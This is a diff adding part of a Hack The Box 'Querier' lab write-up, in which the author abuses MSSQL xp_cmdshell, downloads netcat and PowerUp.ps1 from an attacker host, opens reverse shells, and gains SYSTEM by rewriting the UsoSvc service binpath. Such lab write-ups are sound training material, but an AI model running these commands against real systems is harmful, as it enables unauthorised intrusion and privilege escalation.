@@ -232,6 +232,144 @@ We can also use HashCat.
 
 Took a sec to get hashcat working, had to try a few different ways but got it to work.
 
+Once that went through, now we can try the new creds we got from the hash.
+
+![mssql-svc account](/Images/HTB9Querier/pic5.png)
+
+And we have a connection.  Now, we can try some psexec and different things but if this account isn't an admin level account then it's not really going to give anything.
+
+Now that we've gotten in, let's give the `enable_xp_cmdshell` again and see what we get.
+
+```
+SQL> enable_xp_cmdshell
+[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL> xp_cmdshell dir C:\
+output                                                                             
+--------------------------------------------------------------------------------   
+ Volume in drive C has no label.                                                   
+ Volume Serial Number is 35CB-DA81                                                 
+NULL                                                                               
+ Directory of C:\                                                                  
+NULL                                                                               
+09/15/2018  07:19 AM    <DIR>          PerfLogs                                    
+01/28/2019  11:55 PM    <DIR>          Program Files                               
+01/29/2019  12:02 AM    <DIR>          Program Files (x86)                         
+01/28/2019  11:23 PM    <DIR>          Reports                                     
+01/28/2019  11:41 PM    <DIR>          Users                                       
+01/29/2019  06:15 PM    <DIR>          Windows                                     
+               0 File(s)              0 bytes                                      
+               6 Dir(s)   3,385,180,160 bytes free                                 
+NULL                                                                               
+```
+
+Looks like now we can execute shell commands from our SQL connection.  Using `xp_cmdshell` command, we can put our command in and where we want to execute that command.  Like so:
+
+![user flag](/Images/HTB9Querier/pic6.png)
+
+And we have the user flag.  Now onto the elevation.
+
+So, now that we're here, I want to get a better shell to work with.  So, in order to do that, I'm going to upload netcat to this device and then use the `xp_cmdshell` command in order to get myself a reverse shell going.
+
+So tried the certutil command and it didn't work so found a powershell command to use.
+
+`SQL> xp_cmdshell powershell -c Invoke-WebRequest "http://10.10.14.31/nc.exe" -OutFile "C:\Reports\nc.exe"`
+
+That got the transfer to go and now I have the nc.exe file on the victim device.
+
+![SMB nc.exe](/Images/HTB9Querier/pic7.png)
+
+Now that the file has been moved, lets get our shell.  Start up our netcat listener on our device and then on the sql device, we run the following.
+
+`SQL> xp_cmdshell C:\Reports\nc.exe 10.10.x.x 4444 -e cmd.exe`
+
+Again, the IP should be whatever the IP of your device is.  The `-e cmd.exe` is to execute cmd.exe.  Run that and now we have our nice neat shell.  Don't feel quite so nekid now.
+
+![Clean Shell](/Images/HTB9Querier/pic8.png)
+
+Now that we're here, we want to verify that PowerUp.ps1 has the endline `Invoke-AllChecks` and then use a Powershell line that we've used before to download and run it.
+
+`echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.x.x:80/PowerUp.ps1') | powershell -noprofile -`
+
+Once that runs, we see a couple different items but the one that catches my eye is the one towards the end.
+
+![PowerUp.ps1 Result](/Images/HTB9Querier/pic9.png)
+
+Unless my eyes decieve me, that's the admin password!!  And we now own this device.  Use that username and password to connect to the sql server, use the `xp_cmdshell` function to grab this flag but at this point, we own this device with the admin password.
+
+So let's hop over to SMB and grab the flag.
+
+Get connected to SMB, try to cd over to the Administrator folder in Users and.....wait, what's this?
+
+![denied!!](/Images/HTB9Querier/pic10.png)
+
+Ok, well, let's go look at the PowerUp.ps1 output again.
+
+![PowerUp Output 2](/Images/HTB9Querier/pic11.png)
+
+We also have this service name that we can modify.  Since I've already got netcat moved over let's try this.  We've done this before too.  Start up a nc listener on our device, make sure to use a different port than any previous/currently used ones.
+
+```
+C:\Reports>sc qc UsoSvc
+sc qc UsoSvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: UsoSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+C:\Reports>sc config UsoSvc binpath= "C:\Reports\nc.exe 10.10.x.x 5555 -e cmd.exe"
+sc config UsoSvc binpath= "C:\Reports\nc.exe 10.10.x.x 5555 -e cmd.exe"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\Reports>sc qc UsoSvc
+sc qc UsoSvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: UsoSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Reports\nc.exe 10.10.x.x 5555 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+C:\Reports>sc stop UsoSvc
+sc stop UsoSvc
+
+SERVICE_NAME: UsoSvc 
+        TYPE               : 30  WIN32  
+        STATE              : 3  STOP_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x3
+        WAIT_HINT          : 0x7530
+
+C:\Reports>sc start UsoSvc
+sc start UsoSvc
+```
+
+And then we check our nc listener and.....
+
+![NT Auth/Sys](/Images/HTB9Querier/pic12.png)
+
+And there we go.  We now have root!  This one took a couple new twists and turns.  Learned some new things on this one too.  The ms-sql stuff was something I wasn't as familiar with but will definitely keep that in my handy dandy trick book.
+
+Thanks for coming along.  This was all for the PNPT Windows priv escalation side.  Now onto the Linux side of things.  Until next time my friends :D
+
+
+
 
 
 
